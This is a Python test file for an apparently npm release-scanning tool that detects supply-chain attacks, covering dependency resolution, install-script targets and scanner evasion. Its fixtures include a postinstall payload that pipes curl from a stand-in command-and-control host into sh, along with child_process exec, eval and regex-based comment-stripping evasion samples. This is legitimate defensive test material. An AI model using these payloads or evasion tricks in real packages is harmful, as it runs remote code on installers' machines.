"""Tests for Release Sentinel Stage 6b Part 4 (Fail-closed live mode & security hardening).

Covers:
- Part 4a: Fail-closed live mode for unresolvable dependencies (MEDIUM in live mode, INFO in eval).
- Part 4b: Install targets never exempt (e.g. payload in data/setup.js referenced by postinstall).
- Part 4c: JavaScript comment-stripping evasion protection (regex literal /[/*]/).
- Part 4d: Diff-mode eligibility for established dependencies vs unestablished decoy scenarios.
- Part 4e: peerDependencies and optionalDependencies treated as installed outside lockfile mode.
"""

from __future__ import annotations

import json
import tarfile
from datetime import UTC, datetime, timedelta
from unittest.mock import MagicMock

from release_sentinel.content_scanner import scan_full_release, scan_new_content
from release_sentinel.dependency_resolver import resolve_added_dependency
from release_sentinel.differ import analyze_release, compare_releases
from release_sentinel.extractor import ReleaseContents
from release_sentinel.models import Decision, Severity
from release_sentinel.policy import decide


def _make_release(
    pkg_json: dict | None = None,
    files: dict[str, str | bytes] | None = None,
    version: str = "1.0.0",
) -> ReleaseContents:
    f: dict[str, bytes] = {}
    if files:
        for k, v in files.items():
            f[k] = v.encode("utf-8") if isinstance(v, str) else v
    if pkg_json is not None:
        f["package.json"] = json.dumps(pkg_json).encode("utf-8")
    elif "package.json" not in f:
        f["package.json"] = json.dumps({"name": "test-pkg", "version": version}).encode("utf-8")
    return ReleaseContents(files=f)


class TestPart4aFailClosedLiveMode:
    """Part 4a: Failure to resolve dependency produces MEDIUM (live mode) or INFO (eval mode)."""

    def test_unresolvable_in_live_mode_produces_medium_warn(self):
        old_rel = _make_release(version="1.0.0")
        new_rel = _make_release(
            version="1.1.0",
            pkg_json={"name": "pkg", "version": "1.1.0", "dependencies": {"ghost-dep": "^1.0.0"}},
        )
        mock_client = MagicMock()
        mock_client.get_metadata.side_effect = ConnectionError("Connection refused by npm registry")

        ev = analyze_release(
            new_rel,
            baseline=old_rel,
            as_of=datetime.now(UTC),
            registry_client=mock_client,
            mode="live",
        )
        unres = [e for e in ev if e.id == "unresolvable_dependency"]
        assert len(unres) == 1
        assert unres[0].severity == Severity.MEDIUM
        assert "ConnectionError: Connection refused by npm registry" in unres[0].explanation

        decision, _ = decide(ev)
        assert decision == Decision.WARN

    def test_unresolvable_in_eval_mode_produces_info_allow(self):
        old_rel = _make_release(version="1.0.0")
        new_rel = _make_release(
            version="1.1.0",
            pkg_json={"name": "pkg", "version": "1.1.0", "dependencies": {"ghost-dep": "^1.0.0"}},
        )
        mock_client = MagicMock()
        mock_client.get_metadata.side_effect = TimeoutError("Registry timed out")

        ev = analyze_release(
            new_rel,
            baseline=old_rel,
            as_of=datetime.now(UTC),
            registry_client=mock_client,
            mode="eval",
        )
        unres = [e for e in ev if e.id == "unresolvable_dependency"]
        assert len(unres) == 1
        assert unres[0].severity == Severity.INFO
        assert "TimeoutError: Registry timed out" in unres[0].explanation

        decision, _ = decide(ev)
        assert decision == Decision.ALLOW


class TestPart4bInstallTargetsNeverExempt:
    """Part 4b: Files referenced by install scripts are never exempt even under test/ or data/."""

    def test_payload_in_data_dir_scanned_when_referenced_by_postinstall(self):
        payload_code = (
            "const cp = require('child_process');\n"
            "cp.execSync('curl -s https://evil-c2-command-and-control.net/run | sh');\n"
        )
        old_rel = _make_release(
            pkg_json={"name": "pkg", "version": "1.0.0"},
            files={"index.js": "module.exports = {};\n"},
        )
        new_rel = _make_release(
            pkg_json={
                "name": "pkg",
                "version": "1.0.1",
                "scripts": {"postinstall": "node data/setup.js"},
            },
            files={
                "index.js": "module.exports = {};\n",
                "data/setup.js": payload_code,
            },
        )
        ev = compare_releases(old_rel, new_rel)
        ev_ids = {e.id for e in ev}
        assert "process_exec" in ev_ids
        assert "hardcoded_url" in ev_ids

        exec_ev = [e for e in ev if e.id == "process_exec"][0]
        assert exec_ev.file == "data/setup.js"
        assert exec_ev.severity == Severity.HIGH

    def test_payload_in_data_dir_scanned_in_full_scan_mode(self):
        payload_code = (
            "const cp = require('child_process');\n"
            "cp.execSync('whoami');\n"
        )
        rel = _make_release(
            pkg_json={
                "name": "pkg",
                "version": "1.0.0",
                "scripts": {"postinstall": "node data/setup.js"},
            },
            files={"data/setup.js": payload_code},
        )
        ev = scan_full_release(rel, install_script_targets={"data/setup.js"})
        ev_ids = {e.id for e in ev}
        assert "install_script_executes" in ev_ids


class TestPart4cCommentStrippingRegexEvasion:
    """Part 4c: Regex literal /[/*]/ must not blind the scanner to real code sinks."""

    def test_comment_masking_evasion_detected_in_process_exec(self):
        evasion_code = (
            "const pattern = /[/*]/;\n"
            "const cp = require('child_process');\n"
            "cp.exec('id');\n"
            "/* legitimate end block */\n"
            "module.exports = {};\n"
        )
        old_rel = _make_release(files={"lib/index.js": "module.exports = {};\n"})
        new_rel = _make_release(files={"lib/index.js": evasion_code})

        ev = scan_new_content(old_rel, new_rel, install_script_targets=set())
        ev_ids = {e.id for e in ev}
        assert "process_exec" in ev_ids

    def test_comment_masking_evasion_detected_for_dynamic_code(self):
        evasion_code = (
            "const mask = /[/*]/;\n"
            "eval('console.log(process.env)');\n"
            "/* end */\n"
        )
        old_rel = _make_release(files={"lib/index.js": "module.exports = {};\n"})
        new_rel = _make_release(files={"lib/index.js": evasion_code})

        ev = scan_new_content(old_rel, new_rel, install_script_targets=set())
        ev_ids = {e.id for e in ev}
        assert "dynamic_code" in ev_ids

    def test_real_comments_remain_ignored_for_url_and_code(self):
        normal_code_with_comments = (
            "// eval('this is inside a comment and should not flag')\n"
            "// https://not-a-real-endpoint-in-comment.org/info\n"
            "/*\n"
            " * cp.exec('inside multi-line comment')\n"
            " * https://another-comment-url.org/info\n"
            " */\n"
            "module.exports = function(x) { return x + 1; };\n"
        )
        old_rel = _make_release(files={"lib/index.js": "module.exports = {};\n"})
        new_rel = _make_release(files={"lib/index.js": normal_code_with_comments})

        ev = scan_new_content(old_rel, new_rel, install_script_targets=set())
        ev_ids = {e.id for e in ev}
        assert "dynamic_code" not in ev_ids
        assert "hardcoded_url" not in ev_ids
        assert "process_exec" not in ev_ids


class TestPart4dDiffModeEligibility:
    """Part 4d: Added dependency diffed against previous version only if established."""

    def test_established_dependency_diffed_against_previous(self, tmp_path):
        now = datetime.now(UTC)
        meta = {
            "name": "est-pkg",
            "time": {
                "created": (now - timedelta(days=120)).isoformat(),
                "modified": now.isoformat(),
                "1.0.0": (now - timedelta(days=100)).isoformat(),
                "1.1.0": (now - timedelta(days=80)).isoformat(),
                "1.2.0": (now - timedelta(days=60)).isoformat(),
                "1.3.0": (now - timedelta(days=40)).isoformat(),
                "1.4.0": (now - timedelta(days=10)).isoformat(),
            },
            "versions": {
                "1.0.0": {}, "1.1.0": {}, "1.2.0": {}, "1.3.0": {}, "1.4.0": {}
            },
        }
        client = MagicMock()
        client.get_metadata.return_value = meta

        analyzed_modes = []

        def mock_analyze(new, baseline=None, **kwargs):
            analyzed_modes.append("diff" if baseline is not None else "full-scan")
            return []

        client.download_tarball.return_value = tmp_path / "dummy.tgz"
        with tarfile.open(tmp_path / "dummy.tgz", "w:gz"):
            pass

        ver, ev, status = resolve_added_dependency(
            name="est-pkg",
            spec="^1.4.0",
            as_of=now,
            registry_client=client,
            dest_dir=tmp_path,
            analyze_fn=mock_analyze,
        )
        assert ver == "1.4.0"
        assert analyzed_modes == ["diff"]

    def test_decoy_unestablished_dependency_forces_full_scan(self, tmp_path):
        # Decoy scenario: package created 10 days ago, publishes clean 4.2.0, then malicious 4.2.1
        now = datetime.now(UTC)
        meta = {
            "name": "decoy-pkg",
            "time": {
                "created": (now - timedelta(days=10)).isoformat(),
                "modified": now.isoformat(),
                "4.2.0": (now - timedelta(days=5)).isoformat(),
                "4.2.1": now.isoformat(),
            },
            "versions": {"4.2.0": {}, "4.2.1": {}},
        }
        client = MagicMock()
        client.get_metadata.return_value = meta

        analyzed_modes = []

        def mock_analyze(new, baseline=None, **kwargs):
            analyzed_modes.append("diff" if baseline is not None else "full-scan")
            return []

        client.download_tarball.return_value = tmp_path / "dummy.tgz"
        with tarfile.open(tmp_path / "dummy.tgz", "w:gz"):
            pass

        ver, ev, status = resolve_added_dependency(
            name="decoy-pkg",
            spec="^4.2.0",
            as_of=now,
            registry_client=client,
            dest_dir=tmp_path,
            analyze_fn=mock_analyze,
        )
        assert ver == "4.2.1"
        assert analyzed_modes == ["full-scan"]


class TestPart4ePeersAndOptionalsOutsideLockfile:
    """Part 4e: Outside lockfile mode, treat peer/optional dependencies as installed."""

    def test_peer_and_optional_dependencies_treated_as_installed(self):
        old_pkg = {
            "name": "my-lib",
            "version": "1.0.0",
            "dependencies": {},
        }
        new_pkg = {
            "name": "my-lib",
            "version": "1.0.1",
            "dependencies": {},
            "peerDependencies": {"react": "^18.0.0"},
            "optionalDependencies": {"fsevents": "^2.3.2"},
        }
        mock_client = MagicMock()
        mock_client.get_metadata.return_value = {"versions": {}}

        old_rel = _make_release(pkg_json=old_pkg)
        new_rel = _make_release(pkg_json=new_pkg)

        ev = analyze_release(
            new_rel,
            baseline=old_rel,
            as_of=datetime.now(UTC),
            registry_client=mock_client,
            mode="eval",
        )
        unres = [e for e in ev if e.id == "unresolvable_dependency"]
        unres_text = " ".join(e.explanation for e in unres)
        assert "react" in unres_text
        assert "fsevents" in unres_text
